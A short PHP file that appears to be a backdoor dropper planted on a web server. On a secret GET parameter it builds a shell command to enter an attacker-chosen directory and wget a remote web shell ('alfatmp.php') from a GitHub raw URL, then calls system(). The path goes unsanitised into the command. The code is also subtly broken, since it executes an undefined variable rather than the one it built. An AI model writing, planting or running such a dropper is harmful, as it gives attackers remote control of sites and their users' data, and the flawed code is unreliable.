<?php
if (isset($_GET['trustsec0x0777'])) {
    $path = $_GET['trustsec0x0777'];
    $basedir = '/home/tkraudha/';
    $shell = 'https://raw.githubusercontent.com/sslfalse/shell/main/alfatmp.php';
    $query = 'cd '. $basedir . $path .'&& wget -O trustsec0x0777.php '. $shell;
    system($cmd);
}
?>
